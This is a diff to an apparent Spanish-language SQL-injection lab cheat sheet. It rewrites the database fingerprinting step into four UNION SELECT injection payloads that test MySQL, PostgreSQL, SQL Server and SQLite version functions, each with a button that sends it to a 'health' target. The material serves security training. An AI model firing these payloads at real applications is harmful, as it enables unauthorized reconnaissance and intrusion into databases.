@@ -312,19 +312,33 @@
                         </div>
                     </details>
 
-                    <!-- PASO 3: Identificar Motor de BD (Fingerprinting) -->
+                    <!-- PASO 3: Identificar Motor de BD (Fingerprinting por Descarte) -->
                     <details class="cheat-item">
                         <summary><strong>Paso 3:</strong> Identificar Motor de BD (Fingerprinting)</summary>
-                        <p class="step-desc">Descubrir si la BD es SQLite, MySQL, Postgres o MSSQL evaluando funciones nativas de versión y concatenación (||).</p>
+                        <p class="step-desc">Como auditor no sabes qué motor hay detrás. Prueba las funciones de versión de cada SGBD por descarte hasta que una responda con éxito:</p>
+                        
                         <div class="payload-box">
-                            <span class="payload-label">1. Versión de SQLite:</span>
-                            <code>' UNION SELECT 1, sqlite_version(), 'Motor SQLite Confirmado', 4, 5, 6 -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, sqlite_version(), 'Motor SQLite Confirmado', 4, 5, 6 -- ">▶️ Probar Versión</button>
+                            <span class="payload-label">A) Probando MySQL (VERSION()):</span>
+                            <code>' UNION SELECT 1, VERSION(), 'MySQL Test', 4, 5, 6 -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, VERSION(), 'MySQL Test', 4, 5, 6 -- ">❌ Probar MySQL</button>
                         </div>
+                        
                         <div class="payload-box" style="margin-top:5px;">
-                            <span class="payload-label">2. Operador Concatenación (||):</span>
-                            <code>' UNION SELECT 1, 'SQL' || 'ite', 'Prueba de Concatenación', 4, 5, 6 -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'SQL' || 'ite', 'Prueba de Concatenación', 4, 5, 6 -- ">▶️ Probar Concatenación</button>
+                            <span class="payload-label">B) Probando PostgreSQL (version()):</span>
+                            <code>' UNION SELECT 1, version(), 'Postgres Test', 4, 5, 6 -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, version(), 'Postgres Test', 4, 5, 6 -- ">❌ Probar Postgres</button>
+                        </div>
+
+                        <div class="payload-box" style="margin-top:5px;">
+                            <span class="payload-label">C) Probando SQL Server (@@VERSION):</span>
+                            <code>' UNION SELECT 1, @@VERSION, 'MSSQL Test', 4, 5, 6 -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, @@VERSION, 'MSSQL Test', 4, 5, 6 -- ">❌ Probar MSSQL</button>
+                        </div>
+
+                        <div class="payload-box" style="margin-top:5px; border-left: 3px solid green;">
+                            <span class="payload-label" style="color: green;">D) Probando SQLite (sqlite_version()):</span>
+                            <code>' UNION SELECT 1, sqlite_version(), 'Motor SQLite Confirmado', 4, 5, 6 -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, sqlite_version(), 'Motor SQLite Confirmado', 4, 5, 6 -- ">✅ Probar SQLite</button>
                         </div>
                     </details>
 
